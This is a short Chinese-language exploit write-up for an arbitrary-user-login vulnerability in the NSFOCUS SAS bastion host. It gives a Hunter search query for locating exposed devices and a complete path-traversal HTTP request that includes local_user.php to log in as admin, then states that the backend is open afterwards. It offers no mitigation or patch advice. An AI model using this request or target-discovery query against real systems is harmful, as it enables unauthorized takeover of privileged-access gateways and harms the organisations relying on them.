# 绿盟SAS堡垒机local_user.php任意用户登录漏洞

# 一、漏洞简介
绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录。

# 二、影响版本
+ 绿盟SAS堡垒机

## 三、资产测绘
+ hunter`app.name="NSFOCUS 绿盟 SAS"`

![1692345776559-f5624e5a-4bb4-49a1-891a-79dd9dc6ddce.png](./img/w4hwzlZLp5D37wYG/1692345776559-f5624e5a-4bb4-49a1-891a-79dd9dc6ddce-152262.png)

+ 登录页面

![1692345819090-b23ee8fd-4a29-497b-a62a-e7957b5cfd88.png](./img/w4hwzlZLp5D37wYG/1692345819090-b23ee8fd-4a29-497b-a62a-e7957b5cfd88-428175.png)

# 四、漏洞复现
poc访问出现如下页面即可能存在漏洞

```plain
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=03eea4323452c328c6462f1bb50a0a9b; Hm_lvt_2743f882f7de0bd7d8ffc885a04c90f5=1692345507; Hm_lpvt_2743f882f7de0bd7d8ffc885a04c90f5=1692345507; left_menustatue_NSFOCUSnbspSASH=0|0|https://yzyx.loogear.com/home/status
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1692345978621-ec4e3a8b-10e7-4f9f-83b4-4dd2ae4922f3.png](./img/w4hwzlZLp5D37wYG/1692345978621-ec4e3a8b-10e7-4f9f-83b4-4dd2ae4922f3-330623.png)

然后直接访问堡垒机域名即可计入后台

```plain
http://xx.xx.xx.xx
```

![1692346036852-fabd8787-4603-474b-894e-25a08c3f8394.png](./img/w4hwzlZLp5D37wYG/1692346036852-fabd8787-4603-474b-894e-25a08c3f8394-661387.png)



> 更新: 2024-02-29 23:57:15  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/szf74hcc2561xmxb>